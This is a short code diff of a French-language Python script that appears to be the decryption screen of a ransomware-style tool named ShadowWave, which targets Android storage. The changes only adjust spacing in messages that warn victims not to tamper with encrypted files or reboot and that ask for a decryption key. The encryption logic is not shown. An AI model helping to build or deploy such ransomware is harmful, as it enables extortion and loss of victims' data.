@@ -97,7 +97,7 @@ while True:
         # Afficher le texte avec le mot coloré
     print(phrase_colorée)
     print(f"\n\t\t{RED}AVERTISSEMENT::{RESET}")
-    print("\t\t    [+] Ne renommez pas ou ne modifiez pas les fichiers cryptés.\n\t\t    [+] N'arrêtez pas ou ne redémarrez pas votre appareil car vous nerécupérerez\n\t\t       jamais vos fichiers.\n\t\t    [+] N'entrez aucune clé, nous ne sommes pas responsables de vos propres actions.\n\n")
+    print("\t\t\t[+] Ne renommez pas ou ne modifiez pas les fichiers cryptés.\n\t\t    [+] N'arrêtez pas ou ne redémarrez pas votre appareil car vous nerécupérerez\n\t\t       jamais vos fichiers.\n\t\t    [+] N'entrez aucune clé, nous ne sommes pas responsables de vos propres actions.\n\n")
     print(f"\t\t{GREEN}VEILLEZ ENTREZ LA CLÉ DE DECHIFFREMENT{RESET}")
     key2 = input(f"\tKEY : {ORANGE} ")
 
@@ -107,7 +107,7 @@ while True:
         os.system('clear')
         my_art.to_terminal()
         print("\n"+obj)
-        texte ="\t\t\t\t     Dechiffrement des fichiers en cours..."
+        texte ="\t\t\t\t\tDechiffrement des fichiers en cours..."
         print(BLUE + texte.format("bonjour") + RESET)
         print("\n"+obj+"\n")
         for path, dirs, files in os.walk("/storage/emulated/0/ShadowWave/jael"):
